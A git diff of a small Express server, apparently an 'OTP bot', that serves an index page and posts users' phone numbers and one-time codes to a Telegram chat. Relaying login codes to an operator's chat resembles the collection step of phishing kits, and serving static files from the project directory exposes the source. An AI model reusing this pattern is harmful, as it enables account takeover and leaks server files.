@@ -1,18 +1,19 @@
 const express = require("express");
 const axios = require("axios");
+const path = require("path");
 
 const app = express();
 app.use(express.json());
+app.use(express.static(__dirname));
 
 let otpStore = {};
 
-// 🔐 Get from Render Environment Variables
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-// ✅ Home Route
+// ✅ Show index.html
 app.get("/", (req, res) => {
-  res.send("OTP Bot Server is running 🚀");
+  res.sendFile(path.join(__dirname, "index.html"));
 });
 
 // ✅ Send OTP
@@ -33,7 +34,6 @@ Phone: ${phone}
 OTP: ${otp}
 `;
 
-    // ✅ FIX 1: Must use backticks ``
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
     await axios.post(url, {
@@ -43,7 +43,6 @@ OTP: ${otp}
 
     res.json({ success: true });
   } catch (err) {
-    // ✅ FIX 2: Add ||
     console.log(err.response?.data || err.message);
     res.status(500).json({ success: false });
   }
@@ -61,7 +60,6 @@ app.post("/verify-otp", (req, res) => {
   }
 });
 
-// ✅ FIX 3: Add ||
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
